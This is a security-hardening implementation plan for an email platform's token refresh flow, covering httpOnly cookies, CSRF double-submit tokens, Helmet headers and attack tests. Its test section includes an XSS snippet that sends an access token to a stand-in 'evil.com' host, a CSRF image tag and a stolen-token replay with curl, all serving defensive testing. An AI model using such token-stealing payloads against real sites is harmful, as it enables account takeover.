# Phase 4: Security Hardening

## Context Links

- **Parent Plan**: [plan.md](./plan.md)
- **Phase 1**: [phase-01-backend-refresh-endpoint.md](./phase-01-backend-refresh-endpoint.md)
- **Phase 2**: [phase-02-frontend-token-interceptor.md](./phase-02-frontend-token-interceptor.md)
- **Phase 3**: [phase-03-auth-context-management.md](./phase-03-auth-context-management.md)
- **Security Standards**: OWASP Top 10, OAuth2 RFC 6749

## Overview

**Date**: 2026-02-05
**Priority**: P1 (High)
**Status**: Pending
**Effort**: 1h
**Dependencies**: Phases 1-3 must be implemented

Harden token refresh architecture against common attacks. Evaluate httpOnly cookies vs localStorage, implement CSRF protection, add security headers, and test attack scenarios.

## Key Insights

**Current Security Posture:**
- ✅ Token rotation prevents replay attacks (Phase 1)
- ✅ Reuse detection triggers family revocation (Phase 1)
- ✅ Rate limiting on refresh endpoint (Phase 1)
- ✅ JTI enables token revocation (Phase 1)
- ❌ Tokens in localStorage vulnerable to XSS
- ❌ No CSRF protection on refresh endpoint
- ❌ No Content Security Policy (CSP) headers
- ❌ No device fingerprinting (optional, privacy trade-off)

**OWASP Top 10 Relevant Threats:**
1. **A01:2021 – Broken Access Control** → Mitigated by JWT + token rotation
2. **A02:2021 – Cryptographic Failures** → Mitigated by HTTPS + SHA-256 hashing
3. **A03:2021 – Injection** → Mitigated by Zod validation
4. **A05:2021 – Security Misconfiguration** → THIS PHASE addresses CSP, headers
5. **A07:2021 – Identification and Authentication Failures** → Mitigated by 2FA, rate limiting

## Requirements

### Functional Requirements

1. Evaluate httpOnly cookies vs localStorage for refresh token storage
2. Implement CSRF protection for `/auth/refresh` endpoint
3. Add security headers (CSP, HSTS, X-Frame-Options)
4. Test stolen token scenarios (reuse detection)
5. Verify "logout all devices" functionality
6. Document security trade-offs and decisions
7. Consider device fingerprinting (optional)

### Non-Functional Requirements

- OWASP Top 10 compliance
- Zero trust architecture principles
- Privacy-preserving (GDPR compliant)
- Backward compatible with existing auth flow
- Minimal performance overhead (< 10ms)

## Architecture

### httpOnly Cookies vs localStorage Decision Matrix

| Factor | localStorage | httpOnly Cookies | Winner |
|--------|--------------|------------------|--------|
| XSS Protection | ❌ Vulnerable | ✅ Immune | Cookies |
| CSRF Protection | ✅ Immune | ❌ Vulnerable (needs SameSite) | localStorage |
| Multi-domain | ✅ Easy | ❌ Complex (requires subdomain) | localStorage |
| Mobile app | ✅ Works | ❌ Doesn't work | localStorage |
| Simplicity | ✅ Simple | ❌ Complex | localStorage |
| Industry Standard | ❌ Discouraged | ✅ Recommended | Cookies |

**Decision**: Use **httpOnly cookies** for refresh tokens, **localStorage** for access tokens.

**Rationale**:
- Refresh tokens are long-lived (7 days) → need max security → httpOnly cookies
- Access tokens are short-lived (15 min) → acceptable in localStorage → convenience
- CSRF protection via `SameSite=Strict` easier than XSS mitigation
- This is email platform (web-only), not multi-platform app

## Related Code Files

### Files to Modify

- `services/api/src/routes/auth.ts` (add httpOnly cookie support)
- `services/api/src/server.ts` (add security headers via Helmet)
- `services/web/src/utils/token-manager.ts` (read refresh token from cookies)
- `services/web/src/utils/api.ts` (send cookies with requests)

### Files to Reference

- `services/api/src/middleware/rate-limit-config.ts` (existing rate limits)
- OWASP ASVS 4.0 (security verification standard)

## Implementation Steps

### Step 1: Add Helmet Middleware (Security Headers)

Install Helmet in backend:

```bash
cd services/api
npm install @fastify/helmet
```

Modify `services/api/src/server.ts`:

```typescript
import helmet from '@fastify/helmet';

// After app initialization
await app.register(helmet, {
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Adjust based on frontend needs
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", process.env.WEB_URL || 'http://localhost:5173'],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true,
  },
  frameguard: {
    action: 'deny', // Prevent clickjacking
  },
  referrerPolicy: {
    policy: 'strict-origin-when-cross-origin',
  },
});
```

### Step 2: Migrate Refresh Token to httpOnly Cookies

Modify `/auth/login` and `/auth/register` in `auth.ts`:

```typescript
// After generating tokens (line ~311)
const refreshToken = app.jwt.sign({ userId: user.id, type: "refresh", jti: loginRefreshJti }, { expiresIn: REFRESH_TOKEN_EXPIRY });

// Set httpOnly cookie instead of returning in body
reply.setCookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production', // HTTPS only in prod
  sameSite: 'strict', // CSRF protection
  maxAge: 7 * 24 * 60 * 60, // 7 days in seconds
  path: '/auth/refresh', // Only sent to refresh endpoint
});

return {
  token: accessToken,
  // refreshToken removed from response
  expiresIn: 900,
  user: { id: user.id, email: user.email, role: user.role }
};
```

Modify `/auth/refresh` to read from cookies:

```typescript
app.post("/auth/refresh", { /* ... */ }, async (request, reply) => {
  const refreshToken = request.cookies.refreshToken;

  if (!refreshToken) {
    return reply.status(401).send({ error: "No refresh token provided" });
  }

  // Rest of refresh logic...

  // Set new httpOnly cookie
  reply.setCookie('refreshToken', result.token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60,
    path: '/auth/refresh',
  });

  return {
    token: accessToken,
    expiresIn: 900
  };
});
```

### Step 3: Update Frontend to Send Cookies

Modify `services/web/src/utils/token-manager.ts`:

```typescript
private async _doRefresh(): Promise<string> {
  // Remove refreshToken from localStorage
  const response = await fetch(`${API_BASE}/auth/refresh`, {
    method: 'POST',
    credentials: 'include', // Send cookies
    headers: { 'Content-Type': 'application/json' },
  });

  if (!response.ok) {
    throw new Error('Token refresh failed');
  }

  const data: { token: string; expiresIn: number } = await response.json();
  localStorage.setItem('accessToken', data.token);
  // No need to store refreshToken (in httpOnly cookie)
  return data.token;
}
```

Update Axios instance in `api.ts`:

```typescript
const axiosInstance = axios.create({
  baseURL: API_BASE,
  timeout: 15000,
  withCredentials: true, // Send cookies
  headers: {
    'Content-Type': 'application/json',
  },
});
```

### Step 4: Add CSRF Token (Double Submit Cookie Pattern)

Generate CSRF token on login/register:

```typescript
const csrfToken = crypto.randomBytes(32).toString('hex');

reply.setCookie('csrfToken', csrfToken, {
  httpOnly: false, // Readable by JS
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60,
});

return {
  token: accessToken,
  expiresIn: 900,
  csrfToken, // Return in response body
  user: { id: user.id, email: user.email, role: user.role }
};
```

Verify CSRF token on refresh:

```typescript
app.post("/auth/refresh", { /* ... */ }, async (request, reply) => {
  const csrfCookie = request.cookies.csrfToken;
  const csrfHeader = request.headers['x-csrf-token'];

  if (!csrfCookie || csrfCookie !== csrfHeader) {
    return reply.status(403).send({ error: "CSRF token mismatch" });
  }

  // Rest of refresh logic...
});
```

Frontend sends CSRF token:

```typescript
// In token-manager.ts
private async _doRefresh(): Promise<string> {
  const csrfToken = this.getCsrfToken(); // Read from cookie

  const response = await fetch(`${API_BASE}/auth/refresh`, {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    },
  });

  // ...
}

private getCsrfToken(): string {
  const match = document.cookie.match(/csrfToken=([^;]+)/);
  return match ? match[1] : '';
}
```

### Step 5: Test Attack Scenarios

**XSS Attack Simulation:**
```javascript
// Attacker injects script to steal tokens
<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('accessToken'));
  // Refresh token in httpOnly cookie → CANNOT be stolen
</script>
```

**CSRF Attack Simulation:**
```html
<!-- Attacker's site tries to trigger refresh -->
<img src="https://email-platform.com/auth/refresh" />
<!-- Fails: SameSite=Strict + CSRF token mismatch -->
```

**Token Reuse Attack:**
```bash
# Attacker steals refresh token, uses it twice
curl -X POST https://email-platform.com/auth/refresh \
  -H "Cookie: refreshToken=stolen_token"
# First use: Success, token rotated
# Second use: 401, entire family revoked
```

### Step 6: Verify "Logout All Devices"

Test existing `/auth/logout-all` endpoint:

```bash
curl -X POST https://email-platform.com/auth/logout-all \
  -H "Authorization: Bearer <access_token>"
# Verify all refresh tokens revoked in database
# Verify Redis keys cleared
# Verify all tabs redirect to login (BroadcastChannel)
```

### Step 7: Device Fingerprinting (Optional - Privacy Concern)

**Evaluation**: Device fingerprinting can detect stolen tokens from different devices, but raises GDPR concerns.

**Decision**: **SKIP** for now, rely on existing security (token rotation, rate limiting).

**Future Consideration**: Implement opt-in fingerprinting for users who want extra security.

## Todo List

- [ ] Install `@fastify/helmet` middleware
- [ ] Configure CSP, HSTS, X-Frame-Options headers
- [ ] Migrate refresh token to httpOnly cookies (backend)
- [ ] Update login/register to set httpOnly cookie
- [ ] Update `/auth/refresh` to read from cookies
- [ ] Update frontend to send `credentials: 'include'`
- [ ] Remove `refreshToken` from localStorage
- [ ] Add CSRF token generation on login
- [ ] Add CSRF token verification on refresh
- [ ] Update Axios to send CSRF header
- [ ] Test XSS attack scenario (verify httpOnly protection)
- [ ] Test CSRF attack scenario (verify SameSite + token)
- [ ] Test token reuse attack (verify family revocation)
- [ ] Test "logout all devices" functionality
- [ ] Document security decisions and trade-offs
- [ ] Update API documentation with cookie requirements

## Success Criteria

- ✅ Refresh tokens stored in httpOnly cookies (immune to XSS)
- ✅ CSRF protection via SameSite=Strict + double submit token
- ✅ Security headers (CSP, HSTS, X-Frame-Options) enabled
- ✅ Token reuse detected and entire family revoked
- ✅ "Logout all devices" revokes all tokens + Redis keys
- ✅ XSS attack cannot steal refresh tokens
- ✅ CSRF attack cannot trigger unauthorized refresh
- ✅ OWASP Top 10 compliance verified

## Risk Assessment

**Potential Issues:**
- httpOnly cookies don't work with mobile apps
  - **Mitigation**: Email platform is web-only, acceptable trade-off
- CSRF token adds complexity
  - **Mitigation**: Double submit pattern is industry standard
- SameSite=Strict breaks cross-site navigation
  - **Mitigation**: Email platform is single-origin, no issue

**Performance Concerns:**
- CSRF token verification adds ~5ms overhead
  - **Mitigation**: Acceptable for security benefits
- Cookie parsing on every request
  - **Mitigation**: Fastify cookie plugin is optimized

## Security Considerations

**XSS Protection:**
- Refresh tokens in httpOnly cookies → immune to `document.cookie` theft
- Access tokens still in localStorage → short-lived (15 min) limits exposure
- CSP headers prevent inline script execution

**CSRF Protection:**
- SameSite=Strict prevents cross-site cookie sending
- Double submit token validates request origin
- `/auth/refresh` path-scoped cookie limits attack surface

**Token Theft Mitigation:**
- Stolen access token expires in 15 min
- Stolen refresh token can be used once → rotation detects reuse
- Family revocation prevents spawning new sessions
- Rate limiting prevents brute force attacks

**Privacy Considerations:**
- Device fingerprinting SKIPPED to respect user privacy
- GDPR compliant (minimal data collection)
- Audit logs track IPs for security, not marketing

## Next Steps

1. **Immediate**: Test security headers with SecurityHeaders.com
2. **Phase 5**: Test edge cases (cookie expiry, multi-domain)
3. **Future**: Consider WebAuthn for passwordless auth

**Dependencies:**
- Phase 5 testing validates security hardening

**Follow-up Tasks:**
- Penetration testing with OWASP ZAP
- Security audit by external firm
- Bug bounty program for responsible disclosure
- Monitor OWASP ASVS updates for new requirements

## Unresolved Questions

- Should we implement device fingerprinting despite privacy concerns?
- Should we extend refresh token expiry to 30 days now that httpOnly cookies provide better security?
- Should we add geolocation-based anomaly detection (login from unusual location)?
